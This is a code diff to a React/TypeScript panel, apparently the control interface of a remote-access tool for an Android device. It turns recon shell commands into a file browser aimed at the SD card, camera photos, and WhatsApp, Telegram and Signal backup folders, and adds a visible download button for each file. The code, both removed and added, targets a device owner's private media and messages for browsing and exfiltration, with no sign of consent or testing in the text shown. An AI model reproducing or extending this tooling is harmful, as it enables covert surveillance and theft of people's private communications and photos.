@@ -57,17 +57,20 @@ const CAP_RECON = [
   { icon:'📋', l:'Env Vars',      c:"env" },
 ]
 
-const CAP_FILES = [
-  { icon:'📂', l:'SD Card',        c:"ls -la /sdcard/" },
-  { icon:'📥', l:'Downloads',      c:"ls -la /sdcard/Download/" },
-  { icon:'📸', l:'DCIM',           c:"ls -laR /sdcard/DCIM/ 2>/dev/null" },
-  { icon:'📄', l:'Documents',      c:"ls -la /sdcard/Documents/ 2>/dev/null" },
-  { icon:'💚', l:'WhatsApp',       c:"ls /sdcard/WhatsApp/Media/ 2>/dev/null || ls '/sdcard/Android/media/com.whatsapp/WhatsApp/Media/' 2>/dev/null || echo 'WhatsApp dir not found'" },
-  { icon:'✈️', l:'Telegram',       c:"ls /sdcard/Telegram/ 2>/dev/null || ls /sdcard/Download/Telegram/ 2>/dev/null || echo 'Telegram dir not found'" },
-  { icon:'🔵', l:'Signal Backup',  c:"ls '/sdcard/Signal BackUp/' 2>/dev/null || echo 'Signal backup not found'" },
-  { icon:'🎵', l:'Music',          c:"ls /sdcard/Music/ 2>/dev/null || ls /sdcard/Recordings/ 2>/dev/null" },
-  { icon:'🏠', l:'Home dir',       c:"ls -la ~/" },
-  { icon:'💾', l:'Storage Info',   c:"df -h 2>/dev/null" },
+// CAP_FILES — each entry has a browseable path (opens in file browser) OR
+// a fallback command (for non-directory actions like Storage Info).
+const CAP_FILES: { icon: string; l: string; path?: string; c?: string }[] = [
+  { icon:'📂', l:'SD Card',       path:'/sdcard' },
+  { icon:'📥', l:'Downloads',     path:'/sdcard/Download' },
+  { icon:'📸', l:'DCIM',          path:'/sdcard/DCIM' },
+  { icon:'📄', l:'Documents',     path:'/sdcard/Documents' },
+  { icon:'💚', l:'WhatsApp',      path:'/sdcard/WhatsApp/Media' },
+  { icon:'✈️', l:'Telegram',      path:'/sdcard/Telegram' },
+  { icon:'🔵', l:'Signal Backup', path:'/sdcard/Signal BackUp' },
+  { icon:'📱', l:'Android/Media', path:'/sdcard/Android/media' },
+  { icon:'🎵', l:'Music',         path:'/sdcard/Music' },
+  { icon:'🏠', l:'Home dir',      path:'~' },
+  { icon:'💾', l:'Storage Info',  c:"df -h 2>/dev/null" },
 ]
 
 const CAP_COMMS = [
@@ -494,13 +497,23 @@ export default function Android({ onOpenTerminal }: Props) {
               {/* FILES tab */}
               {activeTab === 'files' && (
                 <div className="flex flex-col gap-2 p-1">
-                  {/* Quick access */}
+                  {/* Quick access — paths open in file browser, commands show in console */}
                   <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-1.5">
                     {CAP_FILES.map(c => (
-                      <button key={c.l} onClick={() => exec(c.c, c.l)} disabled={executing}
+                      <button key={c.l}
+                        onClick={() => {
+                          if (c.path) {
+                            setFsPath(c.path)
+                            browseFs(c.path)
+                          } else if (c.c) {
+                            exec(c.c, c.l)
+                          }
+                        }}
+                        disabled={executing || fsLoading}
                         className="flex items-center gap-2 px-2.5 py-2 rounded border border-border bg-surface hover:border-warn/50 hover:bg-warn/5 transition-colors disabled:opacity-40 text-left">
                         <span className="text-base shrink-0">{c.icon}</span>
                         <span className="text-[10px] text-muted truncate">{c.l}</span>
+                        {c.path && <span className="text-[8px] text-warn/50 ml-auto shrink-0">→</span>}
                       </button>
                     ))}
                   </div>
@@ -541,19 +554,22 @@ export default function Android({ onOpenTerminal }: Props) {
                         )}
                         {fsData.files.map(f => (
                           <div key={f.name}
-                            className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20 group">
+                            className="flex items-center gap-2 px-3 py-1.5 hover:bg-border/20 border-b border-border/20">
                             <span className="text-[10px] shrink-0">{f.is_dir ? '📁' : '📄'}</span>
-                            <button onClick={() => f.is_dir ? browseFs(fsPath + '/' + f.name) : void 0}
-                              className="flex-1 text-[11px] font-mono text-text text-left truncate hover:text-primary">
+                            <button
+                              onClick={() => f.is_dir ? browseFs(fsPath + '/' + f.name) : void 0}
+                              className={`flex-1 text-[11px] font-mono text-left truncate ${f.is_dir ? 'text-warn hover:text-primary cursor-pointer' : 'text-text cursor-default'}`}>
                               {f.name}
                             </button>
                             <span className="text-[9px] text-muted shrink-0">
                               {f.is_dir ? 'dir' : fmtBytes(f.size)}
                             </span>
                             {!f.is_dir && (
-                              <button onClick={() => downloadFile(fsPath + '/' + f.name)}
-                                className="opacity-0 group-hover:opacity-100 text-muted hover:text-primary transition-all">
-                                <Download size={10} />
+                              <button
+                                onClick={() => downloadFile(fsPath + '/' + f.name)}
+                                title={`Download ${f.name}`}
+                                className="flex items-center gap-1 px-1.5 py-0.5 rounded text-[9px] border border-primary/30 text-primary hover:bg-primary/10 transition-colors shrink-0">
+                                <Download size={9} /> DL
                               </button>
                             )}
                           </div>
